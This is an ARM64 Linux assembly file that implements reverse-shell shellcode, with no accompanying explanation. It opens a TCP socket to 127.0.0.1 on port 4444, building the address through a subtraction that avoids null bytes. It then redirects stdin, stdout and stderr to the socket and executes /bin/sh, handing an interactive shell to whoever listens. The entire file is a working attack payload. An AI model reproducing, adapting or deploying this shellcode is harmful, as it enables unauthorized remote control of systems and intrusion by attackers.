
.section .text

.global _start

_start:
    eor x0, x0, x0
    eor x1, x1, x1
    eor x2, x2, x2
    eor x3, x3, x3

create_socket:
    mov x0, 2       // ipv4 as first argument
    mov x1, 1       // tcp as second argument
    mov x8, 0xc6    // socket syscall
    svc #0          // call kernel

    cmp x0, 0
    blt display_fatal_msg
    mov x11, x0      // save fd to temp register

connect_socket:
    sub sp, sp, 16 // store local variables into the stack
    
    mov x9, 2               // AF_INET IP protocol familiy
    str x9, [sp]
    mov x9, 0x5c11            // set port to connect to
    str x9, [sp, 2]
    ldr x9, =0x02010180      // 128.1.1.2
    ldr x10, =0x1010101  // 1.1.1.1
    sub x9, x9, x10
    str x9, [sp, 4]

    mov x8, 0xcb            // connect syscall
    mov x0, x11              // set fd as first argument
    mov x2, 16              // length of the struct
    mov x1, sp              // set the address of the stack to second argument
    svc #0
    eor x2, x2, x2
    add sp, sp, 16  // restore stack state
    cmp x0, 0
    blt display_fatal_msg


dup_fd:
    mov x0, x11          // old fd
    mov x1, x3          // new fd
    mov x8, 24          // dup syscall
    svc #0
    add x3, x3, 1       // inc old fd (0, 1, 2)
    cmp x3, 2
    ble dup_fd
    

// here we can communicate with the socket shell using stdin, stdout, stderr
exec_shell:
    sub sp, sp, 16      // make room for "/bin/sh\x00" string
    ldr x0, =0x0068732f6e69622f
    str x0, [sp]
    mov x0, sp
    eor x1, x1, x1
    eor x2, x2, x2
    mov x8, 221         // execve syscall
    svc #0              // call kernel
    add sp, sp, 16      // restore stack state
    b exit

display_fatal_msg:
    mov x8, 64          // write syscall
    mov x0, 1           // stdout fd
    adr x1, msg         // msg to be printed
    mov x2, len         // msg's len
    svc #0


exit:
    mov x8, 93  // exit syscall
    mov x0, 0   // '0' status code as argument
    svc #0


.section .data
msg:
    .ascii  "[-] Could not connect to server, is the server listening ?\n"
len = . - msg
